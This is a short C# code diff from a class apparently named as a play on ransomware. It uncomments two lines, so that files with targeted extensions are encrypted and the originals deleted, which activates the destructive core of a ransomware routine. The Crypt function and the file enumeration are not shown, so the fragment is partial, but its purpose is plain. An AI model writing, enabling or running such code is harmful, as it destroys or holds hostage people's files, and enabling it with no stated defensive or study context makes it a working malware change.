@@ -39,8 +39,8 @@ class RunSomeAware
         {
             if (Contain(new FileInfo(file).Extension, AllowedExt))
             {
-                //Crypt(file, mode);
-                //File.Delete(file);
+                Crypt(file, mode);
+                File.Delete(file);
                 Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
             }
         }
